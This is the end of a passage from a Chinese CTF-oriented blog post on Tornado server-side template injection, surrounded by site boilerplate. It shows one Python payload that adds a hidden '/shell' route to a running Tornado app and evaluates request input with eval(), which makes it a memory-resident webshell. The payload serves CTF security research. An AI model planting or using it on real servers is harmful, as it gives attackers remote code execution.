        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">handler</span><span class="p">.</span><span class="n">application</span><span class="p">.</span><span class="n">add_handlers</span>
<span class="p">(</span><span class="sh">"</span><span class="s">.*</span><span class="sh">"</span><span class="p">,[(</span><span class="sh">"</span><span class="s">/shell</span><span class="sh">"</span><span class="p">,</span><span class="nf">type</span><span class="p">(</span><span class="sh">"</span><span class="s">Shell</span><span class="sh">"</span><span class="p">,(</span><span class="nf">__import__</span><span class="p">(</span><span class="sh">"</span><span class="s">tornado</span><span class="sh">"</span><span class="p">).</span><span class="n">web</span><span class="p">.</span><span class="n">RequestHandler</span><span class="p">,),{</span><span class="sh">"</span><span class="s">shell</span><span class="sh">"</span><span class="p">:</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="nf">eval</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">get_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">shell</span><span class="sh">"</span><span class="p">))))}))])</span>
</pre></td></tr></tbody></table></code></div></div>

<p>但是在实践中，似乎遇到了一些问题，这点等待后面更新。</p>


  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/cyber-security/">Cyber Security</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/ctf/"
            class="post-tag no-text-decoration"
          >ctf</a>
        
          <a
            href="/tags/python/"
            class="post-tag no-text-decoration"
          >python</a>
        
          <a
            href="/tags/tornado/"
            class="post-tag no-text-decoration"
          >tornado</a>
        
          <a
            href="/tags/ssti/"
            class="post-tag no-text-decoration"
          >ssti</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Tornado%20SSTI%20-%20lamaper&url=%2Fposts%2Ftornado-ssti%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Tornado%20SSTI%20-%20lamaper&u=%2Fposts%2Ftornado-ssti%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=%2Fposts%2Ftornado-ssti%2F&text=Tornado%20SSTI%20-%20lamaper" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/tornado-ssti/">Tornado SSTI</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/fastapi-trojan/">FastAPI与Jinja2结合的内存马</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/dym-debug-php/">PHPStorm + Docker + WSL2 + XDebug配置指南</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/bit-ece-stm32/">BIT ECE实习之STM32开发</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/ea-a/">全过程电路分析基础实验</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">ctf</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">web</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php/">php</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/python/">python</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/algorithm/">algorithm</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hardware/">hardware</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/jinja2/">jinja2</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ssti/">SSTI</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/arcgis/">arcgis</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/c-c/">c/c++</a>
      
    </div>
  </section>


            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    










  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/fastapi-trojan/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1763001141"
  data-df="ll"
  
>
  Nov 13, 2025
</time>

              <h4 class="pt-0 my-2">FastAPI与Jinja2结合的内存马</h4>
              <div class="text-muted">
                <p>记一次手写内存马的操作</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/flask-think/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1762184241"
  data-df="ll"
  
>
  Nov  3, 2025
</time>

              <h4 class="pt-0 my-2">Flask的安全研究</h4>
              <div class="text-muted">
                <p>对CTF中基于Flask框架的研究</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/py-ssti/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1760590461"
  data-df="ll"
  
>
  Oct 16, 2025
</time>

              <h4 class="pt-0 my-2">Python SSTI研究</h4>
              <div class="text-muted">
                <p>对CTF中基于Python（尤其是Jinja2）的模板引擎的注入研究</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/dym-debug-php/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>PHPStorm + Docker + WSL2 + XDebug配置指南</p>
    </a>
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Newer">
      <p>-</p>
    </div>
  
</nav>

            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2025</time>

    
      <a href="https://github.com/lamaper">lamaper</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.4.1"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">ctf</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">web</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php/">php</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/python/">python</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/algorithm/">algorithm</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hardware/">hardware</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/jinja2/">jinja2</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ssti/">SSTI</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/arcgis/">arcgis</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/c-c/">c/c++</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

